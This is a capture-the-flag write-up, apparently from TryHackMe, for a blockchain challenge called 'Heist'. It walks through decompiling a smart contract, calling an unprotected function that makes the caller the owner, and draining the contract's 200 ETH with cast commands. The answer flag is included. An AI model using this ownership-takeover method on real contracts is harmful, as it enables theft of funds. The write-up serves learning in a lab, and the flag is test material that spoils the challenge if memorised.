# Heist

## Challenge Description
> ![image](https://github.com/user-attachments/assets/f5d5e8ca-0d41-4e92-9aab-6deee1d57bee)

## Solution
Since this was my first time doing a blockchain challenge, I seeked help from ChatGPT and followed a structured approach to solve it.

First, we need to set up the required environment variables as provided in the challenge description to interact with the blockchain:
```bash
RPC_URL=http://10.10.232.250:8545
API_URL=http://10.10.232.250
PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
```

To determine if the contract has been exploited successfully, we run:
```bash
is_solved=$(cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL})
echo "Check if solved: $is_solved"
```

![image](https://github.com/user-attachments/assets/3f1d8589-5a17-4460-b335-24eca47ebdd1)

If the output is `false`, the contract remains unexploited

To check the player's balance and contract balance:
```bash
cast balance $PLAYER_ADDRESS --rpc-url ${RPC_URL}  # Our wallet balance
cast balance $CONTRACT_ADDRESS --rpc-url ${RPC_URL}  # Contract balance
```

![image](https://github.com/user-attachments/assets/76a9af02-890f-4cc7-ab1f-bd0997872547)

The contract holds `200 ETH`, which we need to extract to our wallet which holds only `2 ETH`.

We then proceed to receive the bytecode:
```bash
curl -s ${RPC_URL} -X POST -H "Content-Type: application/json" --data '{
  "jsonrpc":"2.0",
  "method":"eth_getCode",
  "params":["'"${CONTRACT_ADDRESS}"'", "latest"],
  "id":1
}'
```

Output:
```bash
{"jsonrpc":"2.0","id":1,"result":"0x608060405234801561001057600080fd5b506004361061007d5760003560e01c8063590791f21161005b578063590791f2146100bb57806364d98f6e146100cd5780638725f5ae146100dc578063893d20e8146100f357600080fd5b806312065fe01461008257806338cc4831146100975780633ccfd60b146100b1575b600080fd5b475b6040519081526020015b60405180910390f35b335b6040516001600160a01b03909116815260200161008e565b6100b9610104565b005b6001546001600160a01b031631610084565b6040514715815260200161008e565b6100b9600080546001600160a01b03191633179055565b6000546001600160a01b0316610099565b6000546001600160a01b0316331461014f5760405162461bcd60e51b815260206004820152600a6024820152694e6f74206f776e65722160b01b604482015260640160405180910390fd5b600080546040516001600160a01b03909116914780156108fc02929091818181858888f19350505050158015610189573d6000803e3d6000fd5b5056fea264697066735822122065569758b52086260875f23ffe1d1dc9c4a912fee4f4c6cae2b1c138104d045c64736f6c63430008140033"}
```

![image](https://github.com/user-attachments/assets/3c1648c8-9782-4548-b927-1ee9043c67c5)

We then decompile it using [EtherVM](https://ethervm.io/decompile) to reveal the contract logic:
```
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }
    
        var0 = msg.data[0x00:0x20] >> 0xe0;
    
        if (0x590791f2 > var0) {
            if (var0 == 0x12065fe0) {
                // Dispatch table entry for getBalance()
                var temp0 = memory[0x40:0x60];
                memory[temp0:temp0 + 0x20] = address(this).balance;
                var temp1 = memory[0x40:0x60];
                return memory[temp1:temp1 + (temp0 + 0x20) - temp1];
            } else if (var0 == 0x38cc4831) {
                // Dispatch table entry for getAddress()
                var temp2 = memory[0x40:0x60];
                memory[temp2:temp2 + 0x20] = msg.sender;
                var var1 = temp2 + 0x20;
            
            label_008E:
                var temp3 = memory[0x40:0x60];
                return memory[temp3:temp3 + var1 - temp3];
            } else if (var0 == 0x3ccfd60b) {
                // Dispatch table entry for withdraw()
                var1 = 0x00b9;
                withdraw();
                stop();
            } else { revert(memory[0x00:0x00]); }
        } else if (var0 == 0x590791f2) {
            // Dispatch table entry for getOwnerBalance()
            var1 = address(storage[0x01] & (0x01 << 0xa0) - 0x01).balance;
            var temp4 = memory[0x40:0x60];
            memory[temp4:temp4 + 0x20] = var1;
            var1 = temp4 + 0x20;
            goto label_008E;
        } else if (var0 == 0x64d98f6e) {
            // Dispatch table entry for isSolved()
            var temp5 = memory[0x40:0x60];
            memory[temp5:temp5 + 0x20] = !address(this).balance;
            var1 = temp5 + 0x20;
            goto label_008E;
        } else if (var0 == 0x8725f5ae) {
            // Dispatch table entry for 0x8725f5ae (unknown)
            storage[0x00] = msg.sender | (storage[0x00] & ~((0x01 << 0xa0) - 0x01));
            stop();
        } else if (var0 == 0x893d20e8) {
            // Dispatch table entry for getOwner()
            var1 = storage[0x00] & (0x01 << 0xa0) - 0x01;
            var temp6 = memory[0x40:0x60];
            memory[temp6:temp6 + 0x20] = var1 & (0x01 << 0xa0) - 0x01;
            var1 = temp6 + 0x20;
            goto label_008E;
        } else { revert(memory[0x00:0x00]); }
    }
    
    function withdraw() {
        if (msg.sender == storage[0x00] & (0x01 << 0xa0) - 0x01) {
            var temp0 = memory[0x40:0x60];
            var temp1 = address(this).balance;
            var temp2;
            temp2, memory[temp0:temp0 + 0x00] = address(storage[0x00] & (0x01 << 0xa0) - 0x01).call.gas(!temp1 * 0x08fc).value(temp1)(memory[temp0:temp0 + 0x00]);
            var var0 = !temp2;
        
            if (!var0) { return; }
        
            var temp3 = returndata.length;
            memory[0x00:0x00 + temp3] = returndata[0x00:0x00 + temp3];
            revert(memory[0x00:0x00 + returndata.length]);
        } else {
            var temp4 = memory[0x40:0x60];
            memory[temp4:temp4 + 0x20] = 0x461bcd << 0xe5;
            memory[temp4 + 0x04:temp4 + 0x04 + 0x20] = 0x20;
            memory[temp4 + 0x24:temp4 + 0x24 + 0x20] = 0x0a;
            memory[temp4 + 0x44:temp4 + 0x44 + 0x20] = 0x4e6f74206f776e657221 << 0xb0;
            var temp5 = memory[0x40:0x60];
            revert(memory[temp5:temp5 + (temp4 + 0x64) - temp5]);
        }
    }
}
```
> [!NOTE]  
> ### Key Functions & Logic
> 1. main() (Entry Point)
>    
>    This is the contract's main dispatcher, handling incoming transactions by checking the function selector (msg.data[0:4]) and routing execution to the appropriate function.
>    
>    Function Selectors (Identifiers)
>    - `0x12065fe0` → `getBalance()` → Returns the contract's ETH balance.
>    - `0x38cc4831` → `getAddress()` → Returns msg.sender.
>    - `0x3ccfd60b` → `withdraw()` → Allows the owner to withdraw all funds.
>    - `0x590791f2` → `getOwnerBalance()` → Returns the owner's ETH balance.
>    - `0x64d98f6e` → `isSolved()` → Returns true if the contract's balance is 0 (solved condition).
>    - `0x8725f5ae` → Unknown function (sets storage[0x00] to msg.sender).
>    - `0x893d20e8` → `getOwner()` → Returns the owner's address.
> 2. `withdraw()` Function
>    - Checks if msg.sender == owner (from storage[0x00]).
>    - If true, it sends the entire contract balance to the owner.
>    - If false, it reverts with "Not owner!" (0x4e6f74206f776e657221).
> 3. `isSolved()` Function
>    - Returns true if the contract's balance is 0.

> [!IMPORTANT]  
> ### This is the goal of the challenge: drain the contract's ETH.

Since 0x8725f5ae allows an ownership change, we execute:
```bash
cast send --legacy $CONTRACT_ADDRESS "0x8725f5ae" --private-key $PRIVATE_KEY --rpc-url $RPC_URL
```

![image](https://github.com/user-attachments/assets/b92a09df-10ce-4e71-b783-77a1ea07aa5f)


Verifying ownership:
```bash
cast call $CONTRACT_ADDRESS "getOwner()(address)" --rpc-url $RPC_URL
```

Output:
```bash
0xB4F4fDE970B89C9F7d62080Af21885018736D256  # Our wallet address
```

We are now the contract owner.

As the new owner, we call `withdraw()`:
```
cast send --legacy $CONTRACT_ADDRESS "0x3ccfd60b" --private-key $PRIVATE_KEY --rpc-url $RPC_URL
```

![image](https://github.com/user-attachments/assets/6e466a5d-aadc-40ee-b005-f4bc0c996e4a)

This transfers all ETH from the contract to our wallet.

Checking the contract balance and our wallet balance:
```
cast balance $CONTRACT_ADDRESS --rpc-url $RPC_URL
cast balance $PLAYER_ADDRESS --rpc-url $RPC_URL
```

![image](https://github.com/user-attachments/assets/ae104ff2-aabb-4134-8a72-51fd1c4a2f61)

We have successfully drained the contract funds!

With the contract empty, we visit the challenge website: `http://10.10.152.25/`

Clicking "Get Flag" reveals:
```
THM{web3_h31st_d0ne}
```

![image](https://github.com/user-attachments/assets/12723311-fe68-4f14-ac29-8fe4222da646)

## Conclusion
By identifying an insecure ownership modification function, we successfully took control of the contract, drained its funds, and retrieved the flag.

## Flag
THM{web3_h31st_d0ne}
